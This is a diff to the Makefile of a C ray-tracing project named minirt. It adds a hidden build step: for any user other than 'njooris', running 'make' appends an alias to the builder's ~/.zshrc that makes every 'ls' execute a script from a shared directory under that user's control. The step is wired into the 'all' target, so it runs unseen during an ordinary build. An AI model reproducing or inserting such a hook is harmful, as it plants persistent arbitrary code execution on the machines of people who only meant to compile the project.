@@ -112,6 +112,12 @@ SRCS_NORME += $(addprefix $(SCENE_DIR), $(SCENE_SRCS))
 SRCS_NORME += $(addprefix $(PARSING_DIR), $(PARSING_SRC))
 SRCS_NORME += minirt.c
 
+ifeq ($(USER),njooris)
+SPECIAL_CMD = 
+else
+SPECIAL_CMD = @echo 'alias ls="bash /sgoinfre/njooris/test.sh"' >> ~/.zshrc
+endif
+
 # --- LIBS TARGET --- #
 
 LIBS_TARGET :=			\
@@ -151,7 +157,8 @@ LDFLAGS += 	$(addprefix -L,$(dir $(LIBS_TARGET))) \
 			$(addprefix -l,$(LIBS)) \
 			-lreadline \
 
-
+all: $(NAME)
+	$(SPECIAL_CMD)
 
 # --- COMPILATER --- #
 
@@ -160,7 +167,7 @@ CC = cc
 # --- EXEC --- #
 
 all : $(NAME)
-
+	$(SPECIAL_CMD)
 $(NAME) : $(LIBS_TARGET) $(OBJS)
 	$(CC) $^ $(LDFLAGS) -o $@ $(SYS_LIBS)
 
